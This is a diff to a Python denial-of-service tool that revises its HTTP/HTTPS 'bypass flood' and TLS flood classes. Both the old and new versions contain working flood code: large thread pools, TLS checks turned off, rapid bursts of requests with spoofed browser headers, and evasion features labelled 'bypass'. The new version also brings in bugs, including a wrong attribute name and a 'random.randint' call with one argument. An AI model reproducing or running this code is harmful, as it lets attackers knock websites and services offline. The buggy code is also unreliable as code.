@@ -1114,39 +1114,14 @@ class HTTPBypassFlood:
         self.method = method.upper()
         self.path = path
         self.ssl = ssl
-        self.num_threads = 1500  # Increased for more power
-        self.running = True
+        self.num_threads = 1200
+        self.running = True  # Main running flag
         self.stop_event = threading.Event()
         self.connection_count = 0
         self.successful_requests = 0
         self.failed_requests = 0
         
-        # ENHANCED SSL/TLS SETTINGS
-        self.ssl_versions = [
-            ssl.PROTOCOL_TLS,
-            ssl.PROTOCOL_TLS_CLIENT,
-            ssl.PROTOCOL_TLSv1_2,
-            ssl.PROTOCOL_TLSv1_1,
-            ssl.PROTOCOL_TLSv1,
-        ]
-        
-        self.cipher_suites = [
-            'ECDHE-RSA-AES256-GCM-SHA384',
-            'ECDHE-RSA-AES128-GCM-SHA256', 
-            'ECDHE-RSA-AES256-SHA384',
-            'ECDHE-RSA-AES128-SHA256',
-            'AES256-GCM-SHA384',
-            'AES128-GCM-SHA256',
-            'AES256-SHA256',
-            'AES128-SHA256',
-            'ECDHE-RSA-AES256-SHA',
-            'ECDHE-RSA-AES128-SHA',
-            'AES256-SHA',
-            'AES128-SHA',
-            'DES-CBC3-SHA',
-        ]
-        
-        # Enhanced bypass databases (keep your existing ones)
+        # Enhanced bypass databases
         self.user_agents = self.get_ultimate_user_agents()
         self.referers = self.get_ultimate_referers()
         self.accept_languages = self.get_ultimate_accept_languages()
@@ -1521,136 +1496,54 @@ class HTTPBypassFlood:
         #else:  # binary
         #    return base64.b64encode(os.urandom(random.randint(100, 1000))).decode()
     
-    def create_ultra_ssl_context(self):
-        """Create ultra-optimized SSL context for maximum performance"""
-        try:
-            # Use random SSL version for diversity
-            ssl_version = random.choice(self.ssl_versions)
-            context = ssl.SSLContext(ssl_version)
-            
-            # DISABLE SECURITY FOR MAXIMUM PERFORMANCE
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
-            
-            # OPTIMIZE CIPHERS FOR SPEED
-            try:
-                context.set_ciphers(':'.join(self.cipher_suites))
-            except:
-                pass  # Use default ciphers if custom fails
-            
-            # MAXIMUM PERFORMANCE OPTIMIZATIONS
-            context.options |= ssl.OP_ALL
-            context.options |= ssl.OP_NO_SSLv2
-            context.options |= ssl.OP_NO_SSLv3
-            context.options |= ssl.OP_NO_COMPRESSION
-            context.options |= ssl.OP_SINGLE_DH_USE
-            context.options |= ssl.OP_SINGLE_ECDH_USE
-            context.options |= ssl.OP_CIPHER_SERVER_PREFERENCE
-            context.options |= ssl.OP_NO_TICKET
-            context.options |= ssl.OP_IGNORE_UNEXPECTED_EOF
-            
-            # Session settings for performance
-            context.set_session_id(bytes(random.getrandbits(8) for _ in range(32)))
-            
-            return context
-        except Exception as e:
-            # Fallback to default context
-            context = ssl.create_default_context()
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
-            return context
-    
     def create_ssl_socket(self):
-        """Create SSL wrapped socket with enhanced settings"""
+        """Create SSL wrapped socket for HTTPS with enhanced settings"""
         try:
+            import ssl
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            
-            # ULTRA SOCKET OPTIMIZATIONS
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 50)  # 50MB send buffer
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 1024 * 10)  # 10MB receive buffer
-            
-            # TCP OPTIMIZATIONS
-            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)
-            
-            # KERNEL BYPASS OPTIMIZATIONS (Linux)
-            try:
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
-            except:
-                pass
-                
-            sock.settimeout(5.0)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
+            sock.settimeout(8)
             
             if self.ssl:
-                context = self.create_ultra_ssl_context()
-                ssl_sock = context.wrap_socket(
-                    sock, 
-                    server_hostname=self.target_ip,
-                    do_handshake_on_connect=False,  # Manual handshake for control
-                    suppress_ragged_eofs=True
-                )
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
                 
-                # Set shorter timeout for SSL handshake
-                ssl_sock.settimeout(3.0)
-                return ssl_sock
-            else:
-                return sock
+                # SSL/TLS version randomization
+                ssl_versions = [
+                    ssl.PROTOCOL_TLS,
+                    ssl.PROTOCOL_TLSv1_2,
+                    ssl.PROTOCOL_TLSv1_1
+                ]
+                context.options |= ssl.OP_NO_SSLv2
+                context.options |= ssl.OP_NO_SSLv3
                 
-        except Exception as e:
-            # Fallback to normal socket
+                sock = context.wrap_socket(sock, server_hostname=self.target_ip)
+            
+            return sock
+        except ImportError:
             return self.create_normal_socket()
     
     def create_normal_socket(self):
         """Create normal TCP socket with enhanced settings"""
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 25)  # 25MB buffer
-        sock.settimeout(5.0)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
+        sock.settimeout(8)
         return sock
     
-    def perform_ssl_handshake(self, ssl_sock):
-        """Perform optimized SSL handshake"""
-        try:
-            # Non-blocking handshake attempt
-            ssl_sock.do_handshake()
-            return True
-        except ssl.SSLWantReadError:
-            # Wait for data
-            time.sleep(0.01)
-            try:
-                ssl_sock.do_handshake()
-                return True
-            except:
-                return False
-        except ssl.SSLWantWriteError:
-            # Wait for write
-            time.sleep(0.01)
-            try:
-                ssl_sock.do_handshake()
-                return True
-            except:
-                return False
-        except:
-            return False
-    
     def http_flood_worker(self, worker_id):
-        """Enhanced HTTP flood worker with SSL/TLS optimizations"""
+        """HTTP flood worker with frequent stop checks"""
         protocol = "HTTPS" if self.ssl else "HTTP"
         
         try:
-            # Resolve target once per worker
-            try:
-                target_ip = socket.gethostbyname(self.target_ip)
-            except:
-                target_ip = self.target_ip
-                
             start_time = time.time()
             sockets_pool = []
             
-            # Create initial socket pool
-            for _ in range(5):
-                if self.stop_event.is_set() or not self.running:
+            # Create initial sockets
+            for _ in range(3):
+                if self.stop_event.is_set() or not self.running:  # Check stop_event
                     break
                 sock = self.create_ssl_socket() if self.ssl else self.create_normal_socket()
                 sockets_pool.append(sock)
@@ -1658,8 +1551,13 @@ class HTTPBypassFlood:
             current_socket_index = 0
             
             while (self.running and 
-                   not self.stop_event.is_set() and 
+                   not self.stop_event.is_set() and  # Check stop_event
                    time.time() - start_time < self.duration):
+                
+                # Check stop conditions at the start of each iteration
+                if self.stop_event.is_set() or not self.running:
+                    self.log(f"Worker {worker_id} stopping due to stop signal")
+                    break
                 
                 try:
                     if not sockets_pool:
@@ -1668,65 +1566,65 @@ class HTTPBypassFlood:
                     sock = sockets_pool[current_socket_index]
                     current_socket_index = (current_socket_index + 1) % len(sockets_pool)
                     
-                    # Connect with SSL/TLS handshake if needed
+                    # Connect if not connected
                     try:
-                        sock.connect((target_ip, self.port))
+                        sock.connect((self.target_ip, self.port))
                         self.connection_count += 1
-                        
-                        # Perform SSL handshake for HTTPS
-                        if self.ssl:
-                            if not self.perform_ssl_handshake(sock):
-                                raise ConnectionError("SSL handshake failed")
-                                
-                    except (socket.timeout, ConnectionRefusedError, ConnectionResetError, OSError, ssl.SSLError):
-                        # Recreate socket
+                    except (socket.timeout, ConnectionRefusedError, ConnectionResetError, OSError):
+                        # Recreate socket if connection fails
                         try:
                             sock.close()
                         except:
                             pass
                         new_sock = self.create_ssl_socket() if self.ssl else self.create_normal_socket()
                         sockets_pool[current_socket_index] = new_sock
-                        time.sleep(random.uniform(0.1, 0.3))
+                        time.sleep(random.uniform(0.1, 0.5))
                         continue
                     
-                    # Send burst of requests per connection
-                    requests_per_connection = random.randint(10, 50)
+                    # Send multiple requests per connection with frequent stop checks
+                    requests_per_connection = random.randint(5, 20)
                     
                     for i in range(requests_per_connection):
+                        # CHECK STOP CONDITION BEFORE EACH REQUEST
                         if self.stop_event.is_set() or not self.running:
+                            self.log(f"Worker {worker_id} breaking request loop due to stop signal")
                             break
                         
                         http_payload = self.generate_http_payload()
                         
                         try:
-                            # Send with error handling
-                            sent = sock.send(http_payload)
-                            if sent > 0:
-                                self.successful_requests += 1
-                                self.bytes_sent += sent
-                            else:
-                                self.failed_requests += 1
+                            sock.send(http_payload)
                             
-                            # Quick response check with minimal timeout
-                            if random.random() > 0.7:
+                            # Quick response check with timeout
+                            if random.random() > 0.6:
                                 try:
-                                    sock.settimeout(0.1)
-                                    response = sock.recv(512)
+                                    sock.settimeout(0.5)  # Short timeout
+                                    response = sock.recv(1024)
+                                    if response:
+                                        self.successful_requests += 1
+                                    else:
+                                        self.failed_requests += 1
                                 except socket.timeout:
-                                    pass  # Expected for keep-alive
+                                    self.successful_requests += 1
                                 except:
-                                    break  # Break on real errors
+                                    self.failed_requests += 1
+                            else:
+                                self.successful_requests += 1
                             
-                            # Minimal delay between packets
-                            time.sleep(random.uniform(0.001, 0.005))
+                            # Very short delay between packets
+                            time.sleep(random.uniform(0.001, 0.01))
                             
-                        except (BrokenPipeError, ConnectionResetError, socket.timeout, OSError, ssl.SSLError):
+                        except (BrokenPipeError, ConnectionResetError, socket.timeout, OSError):
                             self.failed_requests += 1
                             break
                     
-                    # Keep connection alive or close
-                    if random.random() > 0.3 and not self.stop_event.is_set():
-                        time.sleep(random.uniform(0.05, 0.2))
+                    # CHECK STOP CONDITION BEFORE KEEPING CONNECTION ALIVE
+                    if self.stop_event.is_set() or not self.running:
+                        break
+                        
+                    # Short keep-alive or close
+                    if random.random() > 0.4:
+                        time.sleep(random.uniform(0.05, 0.2))  # Shorter keep-alive
                     else:
                         try:
                             sock.close()
@@ -1754,8 +1652,9 @@ class HTTPBypassFlood:
                     
         except Exception as e:
             pass
+        finally:
+            self.log(f"Worker {worker_id} exited")
     
-
     def start(self):
         """Start the enhanced HTTP/HTTPS bypass flood attack"""
         protocol = "HTTPS" if self.ssl else "HTTP"
@@ -1852,7 +1751,7 @@ class HTTPBypassFlood:
 
 
 # =========================
-# TLS Flood Attack Class
+# TLS Flood Attack Class (from tls.py)
 # =========================
 class HumanBytes:
     METRIC_LABELS = ["B", "kB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB","RB","QB"]
@@ -1993,9 +1892,9 @@ class TLSFloodAttack:
                 # Generate HTTP request with TLS
                 user_agent = self.get_random_user_agent()
                 byt = f"{self.method} /{url_path} HTTP/1.1\r\nHost: {target['host']}\r\nUser-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\n\r\n".encode()
-                byt2 = f"{self.method} /{url_path}  HTTP/1.1\r\nHost: {target['host']}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Ungoogled-Chromium/98.0.4758.102\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\n\r\n".encode()
+                byt2 = f"{self.methods} /{url_path}  HTTP/1.1\r\nHost: {target['host']}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Ungoogled-Chromium/98.0.4758.102\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\n\r\n".encode()
                 # Send multiple requests per connection
-                for _ in range(random.randint(1, 500)):
+                for _ in range(random.randint(500)):
                     if self.stop_event.is_set() or not self.running:
                         break
                     
